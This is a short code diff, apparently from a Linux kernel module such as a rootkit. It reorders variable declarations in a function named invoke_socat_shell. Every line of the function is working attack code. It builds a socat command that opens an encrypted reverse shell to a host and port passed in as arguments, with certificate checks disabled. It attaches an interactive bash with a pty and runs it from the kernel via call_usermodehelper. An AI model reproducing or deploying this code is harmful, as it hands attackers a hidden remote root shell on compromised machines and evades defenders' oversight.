@@ -6,17 +6,16 @@
 #include <linux/tcp.h>
 
 void invoke_socat_shell(char *argv[]) {
+  char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", "HOME=/", "TERM=xterm",
+                  NULL};
   int shell_size = (strlen(argv[0]) + strlen(argv[1]) + 79);
   char *shell_cmd = kmalloc(shell_size * sizeof(char), GFP_KERNEL);
+  char *shell[] = {"/bin/bash", "-c", shell_cmd, NULL};
 
   snprintf(shell_cmd, shell_size,
            "socat openssl-connect:%s:%s,verify=0 exec:'bash "
            "-li',pty,stderr,setsid,sigint,sane",
            argv[0], argv[1]);
-
-  char *envp[] = {"PATH=/sbin:/bin:/usr/sbin:/usr/bin", "HOME=/", "TERM=xterm",
-                  NULL};
-  char *shell[] = {"/bin/bash", "-c", shell_cmd, NULL};
   call_usermodehelper(shell[0], shell, envp, UMH_WAIT_EXEC);
 }
 
